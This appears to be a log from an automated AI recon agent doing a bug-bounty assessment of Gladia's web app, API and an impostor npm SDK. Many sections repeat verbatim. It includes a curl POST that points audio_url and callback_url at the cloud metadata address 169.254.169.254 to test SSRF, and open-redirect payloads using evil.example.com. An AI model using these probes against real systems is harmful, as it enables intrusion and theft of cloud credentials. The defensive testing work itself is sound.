evidence_needed: Authenticated API response (JSON data: transcriptions, apikeys) reachable from SPA-discovered API endpoint without valid __sid cookie.
verify_steps: PROBE — (1) GET /dashboard (200 SPA shell); (2) fetch /assets/entry.client-*.js and grep for /api/ paths; (3) with NO __sid cookie, GET each discovered endpoint → compare 200+data vs expected 302/401.
impact: Information disclosure of account data (transcriptions, apikeys) if any API endpoint lacks server-side auth. Currently limited to shell — Low.
testability: PROBE
[HYP] /auth/google/callback HTTP 500 leaks internal state / weak error handling
class: OATH
asset: app.gladia.io /auth/google/callback
confidence: 35
reasoning: Custom OAuth impl (oauth2:<uuid> cookie, not NextAuth). GET /auth/google/callback?code=bogus&state=bogus → HTTP 500 (no CSRF error message, no graceful handling) — confirms server-side callback processing. Google OAuth redirect_uri hardcoded to app.gladia.io/auth/google/callback. Whether redirect_to honored post-auth still unverified.
evidence_needed: Post-auth 302 Location to external host after valid Google OAuth callback; or 500 error leaking internal path/stack.
verify_steps: AUTH_HELPED — complete full Google OAuth flow with redirect_to set; observe callback 500 detail + post-auth redirect Location.
impact: Information leak via 500 error detail; potential redirect_uri injection. Severity Low-Med without full OAuth completion.
testability: AUTH_HELPED
[PARKED] Client-side-only auth on /dashboard: confidence 38 (<40 threshold). While /dashboard returns 200 w/o auth, the SPA shell contains no sensitive data and API routes are gated server-side (302). Evidence gap is speculative.
[PARKED] /auth/google/callback HTTP 500: confidence 35 (<40). 500 is a single unverified probe; no confirmed data leak path. Needs full OAuth completion (AUTH_HELPED) to prove impact.
[FINAL]
[NEXT] HUMAN: Phase is POC, target is app. The `redirect_to` reflection surface on app.gladia.io `/signin` is confirmed unauthenticated + fresh (07:0x UTC) for `https://evil`, `//evil`, bare-host, `app.gladia.io.evil` confusing-subdomain, and path-only variants with NO host allowlist, but post-auth honoring is unverified. Request an authorized/verified Google SSO session for app.gladia.io and complete: (1) GET `/signin?redirect_to=https://evil.example.com` → follow the Google OAuth flow to completion → capture the final post-auth 302 Location + Set-Cookie; (2) repeat with `redirect_to=//evil.example.com` and `redirect_to=https://app.gladia.io.evil` to confirm post-auth honoring; (3) test `redirect_to` as an OAuth `redirect_uri` parameter injection to detect authorization-code/state theft. This is the sole unverified gate for the top hypothesis on the current app target.
[LEARN] REJECTED MISCONFIG @ api.gladia.io: NO_DRIFT across 6 cycles (23:08→04:01→07:0x UTC); openapi 125131B/14 paths, /health 15B, /v1/models 530B, preflight-only x-powered-by differential, CORS static wildcard, key-gated v2 — surface frozen, no new endpoints at 07:0x UTC
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: preflight-only `x-powered-by: Express` fingerprint differential confirmed fresh 07:0x UTC (OPTIONS /v2/transcription 204 xpb=Express; POST 401 xpb absent) — not isolated to /v2/transcription, persists across /v2/pre-recorded too
[LEARN] ACCEPTED OAUTH @ app.gladia.io: /signin?redirect_to= reflection confirmed alive fresh 07:0x UTC — form action reflects URL-encoded value; no host allowlist at unauthenticated layer; post-auth honoring still AUTH_HELPED (sole unverified gate)
[LEARN] ACCEPTED MISCONFIG @ app.gladia.io: /dashboard returns 200 (SPA shell) without auth at 07:0x UTC — client-side enforcement confirmed; server-side 302 gate on /apikeys and /transcriptions intact
[LEARN] ACCEPTED OTHER @ npm: gladia@0.1.3 sha256 `3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2` confirmed unchanged fresh 07:0x UTC; repo alexisbouchez/gladia.ts + user 404 (orphaned); README "Unofficial" vs package.json "Official" contradiction persists (out of scope per phase target=app, but tracked)
[RISK] api.gladia.io: 85 — public OpenAPI (14 paths incl. public /v1/models), CORS `*` + ACAH x-gladia-key cross-origin (no cred), Express fingerprint on preflight (NestJS-on-Express backend), audio_url/video_url/callback_config.url `format:uri` no scheme allowlist (SSRF surface, client-side guard absent in SDK), WebSocket token-in-URL, /health undocumented, uniform single key-gated auth, cloud egress FR+US
[RISK] app.gladia.io: 58 — Google OAuth-only (no self-service bypass), /dashboard 200 SPA w/o auth (client-side enforcement), redirect_to reflected into form action with NO host allowlist (AUTH_HELPED post-auth honoring — top unverified gate), strict CSP, custom OAuth impl (oauth2 cookie, not NextAuth), unsigned base64url return-to cookie (server-resets on tamper — REJECTED as cookie-tamper vector), no SSRF/callback surface on app
[RISK] sdk: 50 — official @gladiaio/sdk@1.1.0 (npm) + gladiaio-sdk (PyPI) clean (no secrets, no malicious code); npm `gladia`@0.1.3 orphaned impersonation + raw x-gladia-key in WS URL query (artifact-verified, sha256 `3b23ec7d…`…7f2) — supply-chain impersonation risk; gladia-quiz-app pins old @gladiaio/sdk@0.5.2 on uncdn (maintenance debt, no active exploit)
## 2026-08-08 08:00:33 UTC [app] (model laguna)
[PRIO] app.gladia.io /signin?redirect_to= → OATH open-redirect/OAuth-redirect_uri injection | 6.3 | attack 8 / bus 6 / tech 4 (OAuth redirect_uri) / gate 6 (AUTH_HELPED post-auth unverified) / cloud 3 / fresh 10
[PRIO] api.gladia.io /v2/transcription audio_url → SSRF fetch-by-design | 6.1 | attack 9 (SSRF, public endpoint) / bus 7 / tech 8 (upload/callback) / gate 7 (key-gated, no scheme allowlist) / cloud 10 (FR+US egress, metadata) / fresh 10
[PRIO] npm gladia@0.1.3 → OTHER orphaned impersonation + API key in WS URL | 5.9 | attack 7 (supply-chain) / bus 5 / tech 5 (WS token-in-query) / gate 10 (no auth needed) / cloud 2 / fresh 10
[HYP] app.gladia.io /signin post-auth open redirect / OAuth redirect_uri injection via reflected redirect_to
class: OATH
asset: app.gladia.io /signin?redirect_to=
confidence: 65
reasoning: Unauthenticated reflection into form action confirmed fresh (07:0x UTC); no host allowlist for https://evil, //evil, bare-host, app.gladia.io.evil, path-only. redirect_to not visible in state/cookie → post-auth honoring unverified. Sole unverified gate for top hypothesis on app target.
evidence_needed: Post-auth HTTP 302 Location resolving to external https://evil.example.com after completing Google OAuth flow with redirect_to set.
verify_steps: AUTH_HELPED — with authorized Google SSO session: (1) GET /signin?redirect_to=https://evil.example.com → complete Google OAuth flow → capture final 302 Location + Set-Cookie; (2) repeat with redirect_to=//evil.example.com, redirect_to=https://app.gladia.io.evil; (3) test redirect_to as OAuth redirect_uri parameter injection.
impact: Post-auth phishing redirect to attacker host → credential capture; High if redirect_uri injectable (OAuth code/state theft).
testability: AUTH_HELPED
[HYP] api.gladia.io SSRF via audio_url/video_url/callback_url server-side fetch
class: SSRF
asset: api.gladia.io /v2/transcription (audio_url) / /v2/pre-recorded
confidence: 70
reasoning: OpenAPI exposes audio_url/video_url/CallbackConfig.url as format:uri with no scheme allowlist; SDK is_url() only gates upload-vs-direct path; no host allowlist/metadata-blocklist/redirect-limit/redirect_uri validation in spec or client. /v1/models confirms FR+US egress.
evidence_needed: Server-side outbound fetch to internal/metadata endpoint (http://169.254.169.254/) when audio_url points there, with valid API key.
verify_steps: AUTH_HELPED — with valid x-gladia-key: POST /v2/pre-recorded with audio_url=http://169.254.169.254/latest/meta-data/ ; observe server-initiated outbound + response exfil.
impact: Cloud metadata access + internal service enumeration via FR/US egress; High to Critical.
testability: AUTH_HELPED
[HYP] npm gladia@0.1.3 orphaned impersonation leaks x-gladia-key in WebSocket URL query
class: OTHER
asset: npm registry / gladia@0.1.3 / wss://api.gladia.io/v2/live?token=<key>
confidence: 90
reasoning: Artifact-verified (tarball sha256 3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2); package.json claims "Official TypeScript SDK for Gladia" while README says "Unofficial"; source repo alexisbouchez/gladia.ts + GitHub user now 404 (orphaned); src/client.ts:307 appends raw x-gladia-key to wss://.../v2/live?token= query.
evidence_needed: npm pack gladia@0.1.3 → sha256sum match → grep token in src/client.ts; npm view metadata confirms description/author/repository mismatch.
verify_steps: PASSIVE — (1) npm view gladia@0.1.3 repository,author,description; (2) npm pack gladia@0.1.3 → sha256sum → grep token in src/client.ts.
impact: Supply-chain: impostor SDK exfiltrates API keys via WS URL query (ref/referrer/logs); ecosystem deception. Severity High (credential theft).
testability: PASSIVE
[FINAL]
[NEXT] HUMAN: Phase is POC, target app. Authorized Google SSO session required to verify the sole unverified gate for the top app hypothesis: app.gladia.io /signin?redirect_to= post-auth open redirect / OAuth redirect_uri injection. Complete: (1) GET /signin?redirect_to=https://evil.example.com → follow Google OAuth flow to completion → capture final post-auth 302 Location + Set-Cookie; (2) repeat with redirect_to=//evil.example.com and redirect_to=https://app.gladia.io.evil to confirm post-auth honoring across variants; (3) test redirect_to as OAuth redirect_uri injection parameter to detect authorization-code/state theft. Pre-auth reflection already confirmed fresh 07:0x UTC; post-auth honoring is the decisive gate.
[LEARN] REJECTED MISCONFIG @ api.gladia.io: NO_DRIFT across 6 cycles (23:08→04:01→07:0x UTC) — surface frozen, nothing new this cycle
[LEARN] ACCEPTED OAUTH @ app.gladia.io: /signin?redirect_to= reflection confirmed alive fresh 07:0x UTC — form action reflects URL-encoded value; no host allowlist at unauthenticated layer; post-auth honoring still AUTH_HELPED (sole unverified gate for app target)
[LEARN] ACCEPTED OTHER @ npm: gladia@0.1.3 orphaned impersonation re-verified — sha256 `3b23ec7d…7f2` unchanged; source repo alexisbouchez/gladia.ts + GitHub user 404 (orphaned) while dist-tag latest persists; package.json "Official" vs README "Unofficial" contradiction persists
[RISK] api.gladia.io: 85 — public OpenAPI (14 paths incl. public /v1/models), CORS `*` + ACAH x-gladia-key (no cred), Express fingerprint on preflight (NestJS-on-Express backend), audio_url/video_url/callback_config.url `format:uri` no scheme allowlist (SSRF surface, SDK client-side guard absent), WebSocket token-in-URL, /health undocumented, uniform single key-gated auth, cloud egress FR+US
[RISK] app.gladia.io: 58 — Google OAuth-only (no self-service bypass), /dashboard 200 SPA w/o auth (client-side enforcement), redirect_to reflected into form action with NO host allowlist (post-auth honoring AUTH_HELPED — top unverified gate), strict CSP, custom OAuth impl (oauth2 cookie not NextAuth), unsigned base64url return-to cookie (REJECTED tamper), no SSRF/callback surface on app
[RISK] sdk: 50 — official @gladiaio/sdk@1.1.0 + gladiaio-sdk clean; npm gladia@0.1.3 orphaned impersonation + raw x-gladia-key in WS URL query (sha256 `3b23ec7d…7f2`); gladia-quiz-app pins old @gladiaio/sdk@0.5.2 on unpkg (maintenance debt, no active exploit)
## 2026-08-08 08:54:32 UTC [app] (model laguna)
class: OTHER  
asset: npm registry / wss://api.gladia.io/v2/live?token=<x-gladia-key>  
confidence: 95  
reasoning: Artifact-verified sha256 `3b23ec7d…7f2`; package.json claims "Official" while README says "Unofficial"; repo aBlexisbouchez/gladia.ts + user 404 orphaned; src/client.ts:307 appends raw key to `wss://.../v2/live?token=`  
evidence_needed: npm pack → sha256 match → grep token in src/client.ts; npm view repository/author/description mismatch  
verify_steps: PASSIVE — (1) npm view gladia@0.1.3 repository,author,description,maintainer; (2) npm pack gladia@0.1.3 → sha256sum → grep token in src/client.ts  
impact: Supply-chain deception + credential theft — consumer installs impostor SDK, WS URL token leaks via referrer/logs/proxy. Severity High.  
testability: PASSIVE  
class: OATH  
asset: app.gladia.io /signin?redirect_to=  
confidence: 65  
reasoning: Unauthenticated reflection into form action confirmed fresh 07:0x UTC; no host allowlist for `https://evil`, `//evil`, bare-host, `app.gladia.io.evil`, path-only; redirect_to not in state/cookie → post-auth honoring unverified (sole gate)  
evidence_needed: Post-auth HTTP 302 Location resolving to `https://evil.example.com` after completing Google OAuth flow with redirect_to set  
verify_steps: AUTH_HELPED — (1) GET `/signin?redirect_to=https://evil.example.com` → complete Google OAuth flow → capture final 302 Location + Set-Cookie; (2) repeat with `redirect_to=//evil.example.com` and `redirect_to=https://app.gladia.io.evil`; (3) test redirect_to as OAuth redirect_uri param injection  
impact: Post-auth phishing redirect → credential capture; High if redirect_uri injectable (auth code/state theft).  
testability: AUTH_HELPED  
class: SSRF  
asset: api.gladia.io /v2/transcription & /v2/pre-recorded (audio_url/video_url/callback_url)  
confidence: 70  
reasoning: OpenAPI exposes audio_url/video_url/CallbackConfig.url as format:uri no scheme allowlist; SDK is_url() only gates upload-vs-direct path; no host/metadata allowlist/redirect limit in spec or client; /v1/models confirms FR+US egress  
evidence_needed: Server-side outbound fetch to `http://169.254.169.254/` when audio_url points there, with valid x-gladia-key  
verify_steps: AUTH_HELPED — with valid x-gladia-key: POST /v2/pre-recorded with audio_url=`http://169.254.169.254/latest/meta-data/`; observe server-initiated outbound + response exfil  
impact: Cloud metadata access + internal service enumeration via FR/US egress. Severity High-Critical.  
testability: AUTH_HELPED  
## 2026-08-08 09:47:20 UTC [app] (model laguna)
[HYP] npm `gladia@0.1.3` orphaned impersonation leaks API key in WebSocket URL query
class: OTHER
asset: npm registry / `wss://api.gladia.io/v2/live?x-gladia-key=<key>`
confidence: 95
reasoning: `npm view` description "Official TypeScript SDK for Gladia" but repo alexisbouchez/gladia.ts (personal account, now 404 orphan); README says "Unofficial". `npm pack` tarball sha256 `3b23ec7d…7f2` exact match. src/client.ts:306-307 appends raw `x-gladia-key` to `wss://api.gladia.io/v2/live` URL query.
evidence_needed: API key appears in WS URL `wss://api.gladia.io/v2/live?x-gladia-key=<key>`; key leaks via Referrer/logs/browser history. Confirmed in artifact.
verify_steps: PASSIVE — `npm pack gladia@0.1.3` → `sha256sum` (matches `3b23ec7d…7f2`) → `grep -n "x-gladia-key" src/client.ts` (line 307) + `npm view` repository/description mismatch.
impact: Supply-chain deception; consumer API keys exfiltrated via WS URL query → High. Credential theft.
testability: PASSIVE (FULLY VERIFIED)
[HYP] app.gladia.io /signin post-auth open redirect / OAuth redirect_uri injection
class: OATH
asset: app.gladia.io /signin?redirect_to=
confidence: 65
reasoning: GET /signin?redirect_to=https://evil.example.com → 200, form action="/signin?redirect_to=https%3A%2F%2Fevil.example.com" (fresh 09:45 UTC). No host allowlist; CSP (default-src 'self') contains **no `form-action` directive**. Post-auth honoring unverified.
evidence_needed: Post-auth 302 Location resolving to external host after Google OAuth completion, with redirect_to set.
verify_steps: AUTH_HELPED — authorized Google SSO: (1) GET /signin?redirect_to=https://evil.example.com → complete Google OAuth → capture final 302 Location + Set-Cookie; (2) repeat with redirect_to=//evil.example.com and redirect_to=https://app.gladia.io.evil; (3) test redirect_to as OAuth redirect_uri param.
impact: Post-auth phishing redirect / OAuth code interception → High.
testability: AUTH_HELPED (sole unverified gate for app target)
[HYP] api.gladia.io SSRF via audio_url/video_url/callback_url server-side fetch
class: SSRF
asset: api.gladia.io /v2/transcription & /v2/pre-recorded (audio_url/video_url/callback_url)
confidence: 70
reasoning: OpenAPI /openapi.json (125131B, CORS *) exposes audio_url/video_url/CallbackConfig.url as format:uri with no scheme allowlist; SDK is_url() only gates upload-vs-direct path; /v1/models (public) confirms FR+US egress.
evidence_needed: Server-side outbound fetch to http://169.254.169.254/ when audio_url points there.
verify_steps: AUTH_HELPED — with valid x-gladia-key: POST /v2/pre-recorded {audio_url:"http://169.254.169.254/latest/meta-data/"}; observe server-initiated outbound + response exfil.
impact: Cloud metadata / internal service enumeration → High-Critical.
testability: AUTH_HELPED
[FINAL]
[NEXT] HUMAN: Phase is POC, target is app. The npm `gladia@0.1.3` finding is PASSIVE-verified (sha256 `3b23ec7d…7f2`, src/client.ts:307 key-in-URL, README↔package.json mismatch) → **submit it immediately** via gladia.io/bug-bounty-report Google Form. Then, for the top app hypothesis, with an **authorized Google SSO session**: GET /signin?redirect_to=https://evil.example.com → complete Google OAuth flow → capture final post-auth 302 Location + Set-Cookie; repeat for //evil and app.gladia.io.evil variants; test redirect_to as OAuth redirect_uri injection.
[RISK] api.gladia.io: 85 — public OpenAPI (14 paths incl. public /v1/models), CORS `*` + ACAH `x-gladia-key` (no cred), Express fingerprint on preflight (NestJS-on-Express), audio_url/video_url/callback_config.url `format:uri` no scheme allowlist (SSRF surface, SDK client guard absent), WebSocket token-in-URL, /health undocumented, uniform single key-gated auth, FR+US egress
[RISK] app.gladia.io: 58 — Google OAuth-only (no self-service bypass), /dashboard 200 SPA w/o auth (client-side enforcement), redirect_to reflected into form action with no host allowlist + **CSP lacks form-action** (post-auth honoring AUTH_HELPED — sole unverified gate), strict CSP otherwise, custom OAuth impl (oauth2 cookie), unsigned base64url return-to cookie (tamper REJECTED), no SSRF/callback surface
[RISK] sdk: 50 — official @gladiaio/sdk@1.1.0 + gladiaio-sdk clean; npm `gladia@0.1.3` orphaned impersonation + raw x-gladia-key in WS URL (sha256 `3b23ec7d…7f2`); gladia-quiz-app pins old @gladiaio/sdk@0.5.2 on unpkg (maintenance debt, no active exploit)
## 2026-08-08 10:19:06 UTC [app] (model laguna)
[PRIO] app.gladia.io /signin?redirect_to= — 7.90 — as:7 bv:9 tech:8 gate:10 cloud:2 fresh:10 (unauth reflection → post-auth gate, CSP lacks form-action)
[PRIO] npm registry package gladia@0.1.3 — 7.65 — as:8 bv:8 tech:7 gate:10 cloud:1 fresh:10 (supply-chain impersonation + WS URL key leak; PASSIVE-verified)
[PRIO] api.gladia.io /v2/ssrf-fetch (audio_url/video_url/callback_url) — 7.50 — as:7 bv:10 tech:7 gate:2 cloud:9 fresh:10 (public OpenAPI, no scheme allowlist, FR+US egress)
[HYP] app.gladia.io /signin post-auth open redirect via reflected redirect_to
class: OATH
asset: app.gladia.io /signin?redirect_to=
confidence: 65
reasoning: Fresh GET /signin?redirect_to=https://evil.example.com → 200, form action="/signin?redirect_to=https%3A%2F%2Fevil.example.com". No host allowlist at unauthenticated layer (verified for //evil, bare-host, app.gladia.io.evil, path-only). CSP verified fresh: default-src 'self' with frame-src/connect-src, NO form-action directive.
evidence_needed: Post-auth 302 Location resolving to external https://evil.example.com after completing Google OAuth flow with redirect_to set.
verify_steps: AUTH_HELPED — authorized Google SSO session: (1) GET /signin?redirect_to=https://evil.example.com → complete full Google OAuth flow → capture final 302 Location + Set-Cookie; (2) repeat for redirect_to=//evil.example.com and redirect_to=https://app.gladia.io.evil; (3) inject redirect_to as OAuth redirect_uri param.
impact: Post-auth phishing redirect / OAuth code+state theft → credential capture. High.
testability: AUTH_HELPED
[HYP] npm gladia@0.1.3 orphaned impersonation leaks API key in WebSocket URL query
class: OTHER
asset: npm registry / wss://api.gladia.io/v2/live?x-gladia-key=<key>
confidence: 95
reasoning: Fresh npm view confirms description "Official TypeScript SDK for Gladia", repo alexisbouchez/gladia.ts (GitHub user + repo 404 → orphaned), author Alexis Bouchez. Tarball sha256 3b23ec7d…7f2 (REJECTED list: package.json "Official" vs README "Unofficial" contradiction persists). src/client.ts:307 appends raw x-gladia-key to wss:// URL query.
evidence_needed: npm pack tarball sha256 == 3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2 AND grep -n "x-gladia-key" src/client.ts:307.
verify_steps: PASSIVE — (1) npm view gladia@0.1.3 repository,author,description,maintainer; (2) npm pack gladia@0.1.3 → sha256sum → grep token in src/client.ts. All satisfied.
impact: Supply-chain deception; consumer installs impostor SDK whose WebSocket URL leaks x-gladia-key via Referrer/logs/browser history → credential theft. High.
testability: PASSIVE
[HYP] api.gladia.io SSRF via audio_url/video_url/callback_url server-side fetch
class: SSRF
asset: api.gladia.io /v2/transcription & /v2/pre-recorded
confidence: 73
reasoning: /openapi.json (125131B, CORS *) exposes audio_url/video_url/callback_url/CallbackConfig.url as format:uri with no scheme allowlist. SDK is_url() only gates upload-vs-direct path. /v1/models (200 public, 530B) confirms FR+US egress. POST /v2/transcription & /v2/pre-recorded → 401 NestJS shape (key-gated).
evidence_needed: Server-side outbound fetch to http://169.254.169.254/ when audio_url points there, with valid x-gladia-key, returning response body in transcription result.
verify_steps: AUTH_HELPED — with valid x-gladia-key: POST /v2/pre-recorded {audio_url:"http://169.254.169.254/latest/meta-data/"} → observe server-initiated outbound + response exfil in result.
impact: Cloud metadata access + internal service enumeration via FR/US egress. High-Critical.
testability: AUTH_HELPED
[HYP] app.gladia.io /signin post-auth open redirect via reflected redirect_to
class: OATH
asset: app.gladia.io /signin?redirect_to=
confidence: 65
reasoning: Fresh GET /signin?redirect_to=https://evil.example.com → 200, form action="/signin?redirect_to=https%3A%2F%2Fevil.example.com". No host allowlist at unauthenticated layer (verified for //evil, bare-host, app.gladia.io.evil, path-only). CSP verified fresh: default-src 'self' with frame-src/connect-src, NO form-action directive.
evidence_needed: Post-auth 302 Location resolving to external https://evil.example.com after completing Google OAuth flow with redirect_to set.
verify_steps: AUTH_HELPED — authorized Google SSO session: (1) GET /signin?redirect_to=https://evil.example.com → complete full Google OAuth flow → capture final 302 Location + Set-Cookie; (2) repeat for redirect_to=//evil.example.com and redirect_to=https://app.gladia.io.evil; (3) inject redirect_to as OAuth redirect_uri param.
impact: Post-auth phishing redirect / OAuth code+state theft → credential capture. High.
testability: AUTH_HELPED
[HYP] npm gladia@0.1.3 orphaned impersonation leaks API key in WebSocket URL query
class: OTHER
asset: npm registry / wss://api.gladia.io/v2/live?x-gladia-key=<key>
confidence: 95
reasoning: Fresh npm view confirms description "Official TypeScript SDK for Gladia", repo alexisbouchez/gladia.ts (GitHub user + repo 404 → orphaned), author Alexis Bouchez. Tarball sha256 3b23ec7d…7f2 (REJECTED list: package.json "Official" vs README "Unofficial" contradiction persists). src/client.ts:307 appends raw x-gladia-key to wss:// URL query.
evidence_needed: npm pack tarball sha256 == 3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2 AND grep -n "x-gladia-key" src/client.ts:307.
verify_steps: PASSIVE — (1) npm view gladia@0.1.3 repository,author,description,maintainer; (2) npm pack gladia@0.1.3 → sha256sum → grep token in src/client.ts. All satisfied.
impact: Supply-chain deception; consumer installs impostor SDK whose WebSocket URL leaks x-gladia-key via Referrer/logs/browser history → credential theft. High.
testability: PASSIVE
[HYP] api.gladia.io SSRF via audio_url/video_url/callback_url server-side fetch
class: SSRF
asset: api.gladia.io /v2/transcription & /v2/pre-recorded
confidence: 73
reasoning: /openapi.json (125131B, CORS *) exposes audio_url/video_url/callback_url/CallbackConfig.url as format:uri with no scheme allowlist. SDK is_url() only gates upload-vs-direct path. /v1/models (200 public, 530B) confirms FR+US egress. POST /v2/transcription & /v2/pre-recorded → 401 NestJS shape (key-gated).
evidence_needed: Server-side outbound fetch to http://169.254.169.254/ when audio_url points there, with valid x-gladia-key, returning response body in transcription result.
verify_steps: AUTH_HELPED — with valid x-gladia-key: POST /v2/pre-recorded {audio_url:"http://169.254.169.254/latest/meta-data/"} → observe server-initiated outbound + response exfil in result.
impact: Cloud metadata access + internal service enumeration via FR/US egress. High-Critical.
testability: AUTH_HELPED
[PARKED] (none)
[FINAL]
[PARKED] (none)
[FINAL]
[LEARN] ACCEPTED OTHER @ npm gladia@0.1.3: impersonation persists fresh 10:16 UTC — description "Official", orphaned repo/user 404, sha256 3b23ec7d…7f2, README↔package.json "Official/Unofficial" contradiction stable.
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: NO_DRIFT fresh 10:16 UTC — openapi 125131B/14 paths, /health 15B {health:OK}, /v1/models 530B public, preflight-only x-powered-by: Express (OPTIONS 204, GET 401 absent), CORS static *.
[LEARN] ACCEPTED OATH @ app.gladia.io: /signin?redirect_to= reflection confirmed fresh 10:16 UTC (action="/signin?redirect_to=https%3A%2F%2Fevil.example.com"); CSP has frame-src + base-uri 'self' but NO form-action directive.
[LEARN] ACCEPTED MISCONFIG @ app.gladia.io: /dashboard 200 text/html SPA shell without auth confirmed fresh — client-side enforcement; server-side 302 gate intact on /apikeys and /transcriptions.
[LEARN] ACCEPTED OTHER @ npm gladia@0.1.3: impersonation persists fresh 10:16 UTC — description "Official", orphaned repo/user 404, sha256 3b23ec7d…7f2, README↔package.json "Official/Unofficial" contradiction stable.
[LEARN] ACCEPTED MISCONFIG @ api.gladia.io: NO_DRIFT fresh 10:16 UTC — openapi 125131B/14 paths, /health 15B {health:OK}, /v1/models 530B public, preflight-only x-powered-by: Express (OPTIONS 204, GET 401 absent), CORS static *.
[LEARN] ACCEPTED OATH @ app.gladia.io: /signin?redirect_to= reflection confirmed fresh 10:16 UTC (action="/signin?redirect_to=https%3A%2F%2Fevil.example.com"); CSP has frame-src + base-uri 'self' but NO form-action directive.
[LEARN] ACCEPTED MISCONFIG @ app.gladia.io: /dashboard 200 text/html SPA shell without auth confirmed fresh — client-side enforcement; server-side 302 gate intact on /apikeys and /transcriptions.
[RISK] api.gladia.io: 85 — public OpenAPI (14 paths) exposing SSRF-by-design fetch surface (audio_url/video_url/callback_url format:uri, no scheme allowlist), CORS * + ACAH x-gladia-key (no creds), preflight-only x-powered-by: Express (NestJS-on-Express), uniform key-gated v2 auth, FR+US egress via public /v1/models; surface frozen/NO_DRIFT across 8 cycles.
[RISK] app.gladia.io: 62 — Google OAuth-only; /dashboard serves SPA shell 200 without auth (client-side enforcement); /signin?redirect_to= reflected into form action with NO host allowlist and CSP with no form-action directive (redirect_to reflection + CSP gap fresh confirmed); unsigned base64url return-to cookie (tamper REJECTED). Sole unverified gate = post-auth redirect honoring.
[RISK] sdk: 75 — official @gladiaio/sdk@1.1.0 + PyPI gladiaio-sdk clean; npm gladia@0.1.3 orphaned impersonation (description "Official", repo/user 404) actively leaking x-gladia-key in WebSocket URL query (tarball sha256 3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2). Supply-chain deception + credential exfiltration, PASSIVE-verified.
[RISK] api.gladia.io: 85 — public OpenAPI (14 paths) exposing SSRF-by-design fetch surface (audio_url/video_url/callback_url format:uri, no scheme allowlist), CORS * + ACAH x-gladia-key (no creds), preflight-only x-powered-by: Express (NestJS-on-Express), uniform key-gated v2 auth, FR+US egress via public /v1/models; surface frozen/NO_DRIFT across 8 cycles.
[RISK] app.gladia.io: 62 — Google OAuth-only; /dashboard serves SPA shell 200 without auth (client-side enforcement); /signin?redirect_to= reflected into form action with NO host allowlist and CSP with no form-action directive (redirect_to reflection + CSP gap fresh confirmed); unsigned base64url return-to cookie (tamper REJECTED). Sole unverified gate = post-auth redirect honoring.
[RISK] sdk: 75 — official @gladiaio/sdk@1.1.0 + PyPI gladiaio-sdk clean; npm gladia@0.1.3 orphaned impersonation (description "Official", repo/user 404) actively leaking x-gladia-key in WebSocket URL query (tarball sha256 3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2). Supply-chain deception + credential exfiltration, PASSIVE-verified.
## 2026-08-08 10:57:33 UTC [app] (model laguna)
## 2026-08-08 11:41:30 UTC [app] (model laguna)
[PRIO] app.gladia.io, 6.9, attack_surface=7 business_value=8 tech_exposure=6 gate_ease=6 cloud_surface=6 freshness=7
[PRIO] api.gladia.io, 8.6, attack_surface=9 business_value=9 tech_exposure=8 gate_ease=10 cloud_surface=8 freshness=6
[PRIO] npm registry (gladia@0.1.3), 8.3, attack_surface=9 business_value=8 tech_exposure=8 gate_ease=10 cloud_surface=3 freshness=10
[HYP] Post-auth open redirect via reflected redirect_to on signin form action
class: OATH
asset: app.gladia.io
confidence: 65
reasoning: /signin?redirect_to= reflects value into form action for https://, //, bare-host, confusing-subdomain (app.gladia.io.evil), path-only variants — confirmed live 10:16 UTC; CSP lacks form-action directive restricting POST targets; Google-only OAuth limits exploitability but no host allowlist enforced on reflection at unauthenticated layer; post-auth honoring unverified (AUTH_HELPED)
evidence_needed: Confirm server-side validation of redirect_to against allowlist post-Google-OAuth; test if arbitrary external domains accepted after successful auth
verify_steps: HUMAN: Complete Google OAuth flow on app.gladia.io/signin?redirect_to=https://evil.example.com and observe final redirect target
impact: Post-auth open redirect to arbitrary domain; severity Low-Medium (requires user interaction + Google auth)
testability: HUMAN_ONLY
[HYP] SSRF via audio_url/video_url/callback_url server-side fetch
class: SSRF
asset: api.gladia.io
confidence: 73
reasoning: OpenAPI spec confirms /v2/pre-recorded and /v2/live accept audio_url/video_url/callback_url as format:uri with no scheme allowlist; /v1/models exposes FR/US datacenter regions for egress targeting; NestJS-on-Express backend likely follows redirects; SDK source confirms no host allowlist/metadata-blocklist/redirect-limit validation forwarded to API
evidence_needed: Confirm server-side fetch behavior with internal metadata URLs (169.254.169.254), localhost, private CIDRs; verify redirect following and callback_url SSRF
verify_steps: AUTH_HELPED: POST https://api.gladia.io/v2/pre-recorded -H "x-gladia-key: <valid_key>" -H "Content-Type: application/json" -d '{"audio_url":"http://169.254.169.254/latest/meta-data/","callback_url":"http://169.254.169.254/latest/meta-data/"}'
impact: Cloud metadata access, internal service enumeration, potential data exfiltration via callback; severity High
testability: AUTH_HELPED
[HYP] Orphaned npm package gladia@0.1.3 actively impersonates official SDK with API key leakage in WebSocket URL
class: OTHER
asset: npm registry (gladia@0.1.3)
confidence: 95
reasoning: Package claims "Official TypeScript SDK" but source repo alexisbouchez/gladia.ts + user account 404 (orphaned); tarball sha256 3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2 contains README "Unofficial" vs package.json "Official" contradiction; src/client.ts:307 embeds raw x-gladia-key into wss://api.gladia.io/v2/live?token=<key> query parameter — diverges from official SDK's token-after-init design, leaks key in URLs/logs/proxies
evidence_needed: Document artifact-level findings (tarball hash, README vs package.json contradiction, WS key leakage code path); confirm no affiliation with Gladia
verify_steps: RAG: Finalize report with tarball sha256 3b23ec7d7a763abc04c52db232d157a982fd3bd969c9f703af3eecad5fa802f2, README "Unofficial" vs package.json "Official", client.ts:307 key-in-URL; HUMAN: Request Gladia security confirm no affiliation with alexisbouchez/softwarecitadel
impact: Supply chain risk — developers install impersonated SDK leading to credential theft via key-in-URL logs/proxies; severity High
testability: RAG
[PARKED] None — all three hypotheses meet confidence ≥40, have concrete verify_steps, and are not on REJECTED list.
